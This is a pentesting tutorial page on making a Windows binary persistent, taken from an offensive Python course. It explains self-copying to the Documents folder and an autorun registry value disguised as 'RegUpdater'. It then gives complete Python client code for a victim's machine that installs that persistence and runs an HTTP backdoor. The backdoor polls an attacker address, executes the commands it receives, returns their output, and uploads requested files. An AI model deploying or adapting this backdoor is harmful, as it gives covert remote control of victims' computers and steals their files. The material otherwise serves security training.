---
title: Making your binary persistent
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - persistence
  - registry
---

# Making your binary persistent

In order for a binary to persist, the binary must do three things:

**1.** To copy itself into a different location. We need source path (current working directory) and destination path, for instance, the Document folder. This means that we need to know the username: 

	```cmd
		c:\Users\<username>\Documents
	```
	
**2.** To add a registry key pointing to our new exe location. This is done only the first time.

**3.** For consecutive times, we have to avoid repeating steps 1 and 2.


## Phases for persistence

### 1. System recognition

Getting to know the current working directory + the user profile.


### 2. Copy the binary to a different location

If the binary is not found in the destination folder, we can assume this is the first time we're running it. Then:

We will copy the binary to a different location. For that, we need a source path (current working directory) and a destination path, for instance, the Document folder. This means that we need to know the current working directory (for the source path)  and the username (for the destination path): 

	```cmd
		c:\Users\<username>\Documents
	```

This information was already retrieved in step 1 (System recognition).

### 3. Add a Registry key 

If the binary is not found in the destination folder, we can assume this is the first time we're running it. Then:

We will add a Registry key.

### 4. Fire up our shell


## Client side

To be run on our victim's machine.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import requests
import os
import subprocess
import time
import shutil 
import winreg as wreg

#Reconn Phase
path = os.getcwd().strip('/n')

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')

destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'

#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 
if not os.path.exists(destination):
    shutil.copyfile(path+'\client.exe', destination) #You can replace   path+'\client.exe' with sys.argv[0] ---> the sys.argv[0] will return the file name

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()



#Last phase is to start a reverse connection back to our kali machine

while True:
    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.152:8080/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)


```
